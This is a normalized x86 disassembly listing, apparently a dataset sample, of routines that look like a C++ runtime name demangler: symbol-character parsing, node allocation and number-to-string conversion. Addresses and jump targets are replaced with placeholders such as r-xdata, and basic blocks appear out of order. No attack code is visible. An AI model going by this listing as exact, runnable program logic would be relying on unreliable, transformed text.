mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
pop ebp
retn 0x8
sub_42172a
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax ]
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call [ esi + 0x4 ]
pop ecx
sub_421752
mov ecx [ rwxdata ]
mov dl [ ecx ]
test dl dl
jne r-xdata
cmp dl 0x30
jl r-xdata
xor eax eax
retn
xor eax eax
jmp r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x40
jne r-xdata
movsx eax dl
sub eax 0x2f
inc ecx
mov [ rwxdata ] ecx
retn
test dl dl
je r-xdata
mov dl [ ecx ]
inc ecx
mov [ rwxdata ] ecx
cmp dl 0x40
je r-xdata
cmp dl 0x41
jl r-xdata
retn
or eax 0xffffffff
cmp dl 0x50
jg r-xdata
movsx edx dl
shl eax 0x4
inc ecx
lea eax [ eax + edx - 0x41 ]
mov [ rwxdata ] ecx
mov dl [ ecx ]
sub_4217b5
mov ecx [ rwxdata ]
push ebx
push esi
mov edx 0x4000
push edi
mov al [ ecx ]
cmp al 0x41
jl r-xdata
inc ecx
mov esi edx
mov [ rwxdata ] ecx
cmp al 0x24
jne r-xdata
cmp al 0x5a
jle r-xdata
mov al [ ecx ]
cmp al 0x30
jl r-xdata
xor bl bl
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
cmp eax 0x42
jg r-xdata
movsx eax [ ecx ]
sub eax 0x41
mov edx 0x8000
inc ecx
or esi edx
mov [ rwxdata ] ecx
test al 0x1
je r-xdata
cmp al 0x39
jne r-xdata
cmp al 0x38
jg r-xdata
sub eax 0x43
je r-xdata
je r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
xor ecx ecx
test al al
setne cl
add ecx 0xfffe
mov esi ecx
inc ecx
mov [ rwxdata ] ecx
mov esi 0xfffd
jmp r-xdata
movsx eax al
inc ecx
add eax 0xffffffd0
and esi 0xffff7fff
mov [ rwxdata ] ecx
cmp eax 0x8
ja r-xdata
or esi 0x7c00
dec eax
je r-xdata
or esi 0x9800
jmp r-xdata
test eax eax
je r-xdata
mov eax esi
mov ebx 0xffff9fff
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x18
jge r-xdata
mov eax 0xffff
jmp r-xdata
jmp [ eax * 4 + jump_table_421c7d ]
and esi 0xfffff5ff
or esi 0x9100
jmp r-xdata
dec eax
je r-xdata
inc ecx
mov [ rwxdata ] ecx
jmp r-xdata
mov esi 0xfffe
dec ecx
jmp r-xdata
cmp eax 0x24
jne r-xdata
and esi ebx
and esi 0xffffefff
or esi edi
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
and esi 0xffffdfff
or esi edx
jmp r-xdata
and esi 0xffffe3ff
or esi 0x6000
jmp r-xdata
and esi 0xffffbfff
or esi 0x2000
jmp r-xdata
and esi 0xffffebff
or esi 0x6800
jmp r-xdata
and esi 0xfffff3ff
or esi 0x7000
jmp r-xdata
and esi 0xfffffbff
or esi 0x7800
jmp r-xdata
and esi 0xfffff6ff
or esi 0x9200
jmp r-xdata
sub eax 0xd
jne r-xdata
cmp eax 0x2f
jle r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0x50
jne r-xdata
test edx esi
je r-xdata
cmp ecx 0x8
je r-xdata
mov ecx eax
and ecx 0x18
je r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
inc ecx
mov [ rwxdata ] ecx
mov al [ ecx ]
cmp al 0x30
mov bl 0x1
jl r-xdata
cmp eax 0x35
jle r-xdata
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
cmp eax 0x4a
jg r-xdata
mov ecx eax
and esi 0xffffefff
or esi edi
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
cmp ecx 0x10
je r-xdata
and esi 0xffffefff
or esi 0x800
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
test edx esi
je r-xdata
xor ecx ecx
test al al
sete cl
add ecx 0xfffe
mov eax ecx
jmp r-xdata
cmp al 0x35
jg r-xdata
movsx eax [ ecx ]
mov edx 0x8000
or esi edx
sub eax 0x30
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x41
jne r-xdata
cmp eax 0x4c
jl r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffff9fff
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xfffff4ff
or esi 0x9000
jmp r-xdata
cmp eax 0x4d
jle r-xdata
inc ecx
mov [ rwxdata ] ecx
mov al [ ecx ]
cmp al 0x30
jl r-xdata
sub eax 0x0
je r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
and esi 0xfffffdff
or esi 0x500
and esi 0xfffffeff
or esi 0x600
jmp r-xdata
test bl bl
je r-xdata
inc ecx
mov [ rwxdata ] ecx
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov esi 0xffff
jmp r-xdata
cmp al 0x39
jg r-xdata
mov eax 0xfffe
jmp r-xdata
sub eax 0x46
je r-xdata
and esi ebx
jmp r-xdata
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xfffff9ff
or esi 0x100
jmp r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
test al 0x1
je r-xdata
xor esi esi
cmp [ ecx ] 0x5f
jne r-xdata
cmp eax 0x51
movsx eax al
lea eax [ ecx + eax - 0x2f ]
mov [ rwxdata ] eax
call sub_4217b5
or eax 0x10000
jmp r-xdata
dec eax
dec eax
jmp r-xdata
and esi 0xfffffcff
or esi 0x400
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
jne r-xdata
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
sub_421d75
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
not eax
test al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax * 4 + r--data ]
jne r-xdata
pop ebp
retn
inc eax
inc eax
sub_421d93
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x7
and edi 0xfffffff8
cmp [ ebp + 0xc ] 0x0
mov esi ecx
je r-xdata
test edi edi
ja r-xdata
push edi
call [ esi ]
pop ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
push ebx
cmp eax edi
jae r-xdata
push 0x8
pop edi
pop edi
pop esi
pop ebp
retn 0x8
sub eax edi
mov [ esi + 0x10 ] eax
mov ebx 0x1000
cmp edi ebx
ja r-xdata
xor eax eax
jmp r-xdata
push 0x1
push 0x1004
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
pop ebx
xor eax eax
and [ eax ] 0x0
jmp r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx + 0x4 ]
sub ebx edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ebx
jmp r-xdata
sub_421f2b
mov edi edi
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x4 ] 0x3
je r-xdata
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x4 ]
cmp dl 0x1
jle r-xdata
mov [ eax + 0x4 ] dl
sub_421fb0
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
test ecx ecx
je r-xdata
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
mov dl [ ecx + 0x4 ]
cmp dl 0x2
je r-xdata
xor ecx ecx
cmp dl 0x3
jne r-xdata
sub_422020
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax ecx
mov [ eax + 0x4 ] edx
dec edx
neg edx
sbb edx edx
and edx 0xfffffffc
add edx 0x4
mov [ eax ] r--data
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_422055
mov edi edi
push ebp
mov ebp esp
xor ecx ecx
inc ecx
test [ rwxdata ] cl
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3
ja r-xdata
or [ rwxdata ] ecx
mov eax r--data
xor edx edx
mov [ rwxdata ] eax
mov [ rwxdata ] edx
mov [ rwxdata ] edx
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x4
mov [ rwxdata ] eax
mov [ rwxdata ] 0x2
mov [ rwxdata ] edx
mov [ rwxdata ] eax
mov [ rwxdata ] 0x3
mov [ rwxdata ] edx
mov eax rwxdata
pop ebp
retn
imul eax eax 0xc
add eax rwxdata
pop ebp
retn
sub_4220fc
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jge r-xdata
mov eax [ esi + 0xc ]
pop esi
retn
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
push ebx
push edi
mov edi [ esi + 0x4 ]
call [ eax ]
mov ebx eax
mov eax [ edi ]
mov ecx edi
call [ eax ]
add ebx eax
pop edi
mov [ esi + 0xc ] ebx
pop ebx
sub_422127
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test al al
jne r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
pop esi
jmp [ eax + 0x4 ]
sub_422143
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
push eax
call [ edx + 0x8 ]
sub_42217d
mov edi edi
push esi
mov esi edx
test esi esi
jbe r-xdata
pop esi
retn
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_422193
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
dec [ ebp + 0x8 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov al [ ecx ]
test al al
je r-xdata
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
cmp al [ edx ]
jne r-xdata
inc ecx
inc edx
sub_4221bd
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax ecx
or [ eax ] 0xffffffff
lea ecx [ eax + 0x2c ]
or [ ecx ] 0xffffffff
mov [ rwxdata ] edx
mov [ rwxdata ] edx
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
push esi
mov esi [ ebp + 0x10 ]
mov [ rwxdata ] esi
mov [ rwxdata ] edx
pop esi
jmp r-xdata
mov [ rwxdata ] ecx
mov ecx [ ebp + 0x18 ]
mov [ rwxdata ] ecx
mov ecx [ ebp + 0x14 ]
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
pop ebp
retn 0x14
sub_42222c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor ecx ecx
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
call sub_425bde
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_422261
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push 0x1
xor ecx ecx
lea eax [ ebp - 0x8 ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
call sub_425bde
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_4222ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
sub eax edi
cmp esi eax
jle r-xdata
test esi esi
jbe r-xdata
mov esi eax
lea eax [ edi + esi ]
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx edi
sub eax edi
mov edx esi
push ebx
mov bl [ eax + ecx ]
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
pop ebx
sub_4222e5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_421fb0
jmp r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
mov [ esi ] eax
setne al
dec al
and al 0x3
mov [ esi + 0x4 ] al
jmp r-xdata
sub_422338
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
and [ esi + 0x4 ] 0xffff00ff
cmp ecx 0x2
je r-xdata
mov eax ecx
cmp ecx 0x3
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ecx
call sub_422055
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x3
and [ esi ] 0x0
mov [ esi + 0x4 ] al
cmp ecx 0x1
jne r-xdata
sub_42237d
mov edi edi
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov [ esi ] 0x0
mov edi [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax ]
lea edi [ eax + 0x1 ]
push esi
push edi
mov ecx rwxdata
call sub_421d93
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea eax [ esi + edi - 0x1 ]
push eax
push esi
call sub_421f13
mov [ eax ] 0x0
jmp r-xdata
sub_4223d5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x10
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
push [ esi ]
call sub_4220db
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_422414
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_421fb0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_422461
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] al
cmp eax 0x1
jne r-xdata
and [ esi ] 0x0
push eax
call sub_422055
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x3
jmp r-xdata
sub_422498
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x9
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
pop edi
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
xor eax eax
mov ecx [ edi ]
mov [ eax ] ecx
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
inc [ esi ]
mov ecx [ esi ]
mov [ esi + ecx * 4 + 0x4 ] eax
test eax eax
je r-xdata
sub_4224e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x9
ja r-xdata
push 0x3
mov edx [ ecx ]
cmp edx 0xffffffff
je r-xdata
push 0x2
jmp r-xdata
cmp eax edx
jg r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + eax * 4 + 0x4 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop ebp
retn 0x8
sub_422522
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov [ esi ] r--data
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov ecx rwxdata
call sub_421d93
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
test edi edi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
jmp r-xdata
sub_4225ac
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x4
push r--data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4222ae
add esp 0x10
jmp r-xdata
pop ebp
retn 0x8
sub_4225d5
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
cmp [ eax ] 0x40
push [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x8 ]
call sub_426949
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
inc [ rwxdata ]
call sub_4222e5
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_422619
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
push eax
call sub_422461
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
test eax eax
je r-xdata
push eax
call sub_422055
pop ecx
push eax
mov ecx esi
call sub_4223d5
jmp r-xdata
sub_42265b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x3
call sub_422461
jmp r-xdata
mov [ esi + 0x4 ] 0x2
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x8
sub eax 0x0
je r-xdata
mov [ esi + 0x4 ] 0x3
jmp r-xdata
dec eax
push 0x0
mov ecx rwxdata
je r-xdata
pop edi
push 0x8
call sub_421d93
test eax eax
je r-xdata
push 0xc
call sub_421d93
test eax eax
je r-xdata
xor eax eax
mov cl [ edi ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
push edi
call sub_422522
jmp r-xdata
mov [ esi ] eax
test eax eax
jne r-xdata
sub_4226d7
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_42265b
sub_422704
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
cmp eax edx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
xor ecx ecx
cmp [ eax ] dl
je r-xdata
push ecx
push eax
mov ecx esi
call sub_42265b
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
sub_42273d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor edx edx
push edi
mov edi ecx
mov [ edi + 0x4 ] dl
and [ edi + 0x4 ] 0xffff00ff
mov [ edi ] edx
mov eax [ esi ]
cmp eax edx
je r-xdata
mov [ edi + 0x4 ] 0x2
cmp [ eax ] dl
je r-xdata
mov [ edi + 0x4 ] 0x1
jmp r-xdata
mov [ ebp + 0x8 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x8
push edx
push [ ebp + 0x8 ]
mov ecx edi
call sub_42265b
mov eax [ esi ]
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x5f
je r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
inc eax
mov [ esi ] eax
cmp cl [ ebp + 0xc ]
je r-xdata
inc edx
inc ecx
mov eax ecx
mov [ esi ] ecx
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x24
je r-xdata
and [ edi ] 0x0
mov [ edi + 0x4 ] 0x3
jmp r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al [ ebp + 0xc ]
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x39
jle r-xdata
test [ rwxdata ] 0x10000
je r-xdata
cmp al 0xfe
jbe r-xdata
sub_4227fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor eax eax
push esi
mov esi ecx
push edi
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
lea edi [ ebp - 0x8 ]
mov [ esi ] eax
mov [ ebp - 0x8 ] al
push 0x0
push 0xa
push [ ebp + 0xc ]
dec edi
push [ ebp + 0x8 ]
call sub_413c80
add cl 0x30
mov [ ebp + 0x8 ] eax
or eax edx
mov [ ebp - 0x20 ] ebx
mov [ edi ] cl
mov [ ebp + 0xc ] edx
jne r-xdata
lea eax [ ebp - 0x8 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_42265b
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn 0x8
sub_42286a
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
xor ecx ecx
mov [ esi + 0x4 ] cl
and [ esi + 0x4 ] 0xffff00ff
cmp eax ecx
push edi
lea edi [ ebp - 0x7 ]
mov [ esi ] ecx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x1d ] cl
jg r-xdata
push ebx
jmp r-xdata
jl r-xdata
push ecx
push 0xa
push eax
push [ ebp + 0x8 ]
dec edi
call sub_413c80
add cl 0x30
mov [ ebp + 0x8 ] eax
mov [ edi ] cl
mov ecx [ ebp + 0x8 ]
mov eax edx
or ecx eax
mov [ ebp - 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
neg edx
adc eax ecx
mov [ ebp - 0x1d ] 0x1
neg eax
mov [ ebp + 0x8 ] edx
cmp [ ebp + 0x8 ] ecx
jae r-xdata
xor ecx ecx
pop ebx
cmp [ ebp - 0x1d ] cl
je r-xdata
lea eax [ ebp - 0x7 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_42265b
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
xor ecx ebp
pop esi
call sub_40b762
leave
retn 0x8
dec edi
mov [ edi ] 0x2d
sub_422905
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_422619
mov eax esi
pop esi
pop ebp
retn 0x8
sub_422929
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
movsx eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_422619
jmp r-xdata
push ecx
mov ecx esi
call sub_4223d5
push eax
mov ecx esi
call sub_421f4a
jmp r-xdata
sub_42296c
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ edi ] 0x0
jne r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
push esi
call sub_422414
jmp r-xdata
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
cmp al 0x1
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_421fb0
jmp r-xdata
movsx eax al
push eax
call sub_422619
jmp r-xdata
push eax
mov ecx edi
call sub_4223d5
sub_4229d3
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_42265b
sub_422a00
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
xor ecx ecx
cmp [ eax ] dl
je r-xdata
push ecx
push eax
mov ecx esi
call sub_42265b
mov eax esi
pop esi
pop ebp
retn 0x4
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
sub_422a35
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
push 0x1
movsx eax al
sub eax 0x41
inc [ rwxdata ]
cmp eax 0xc
ja r-xdata
push 0x2
jmp r-xdata
mov ecx [ rwxdata ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
leave
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
and eax 0xfffffffe
sub eax 0x0
je r-xdata
push 0x1
push 0x2
pop ecx
sub eax ecx
je r-xdata
push ecx
jmp r-xdata
sub eax ecx
je r-xdata
call sub_421d75
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_422a00
push 0x4
jmp r-xdata
sub eax ecx
je r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
push 0x5
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x6
jmp r-xdata
sub_422adf
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
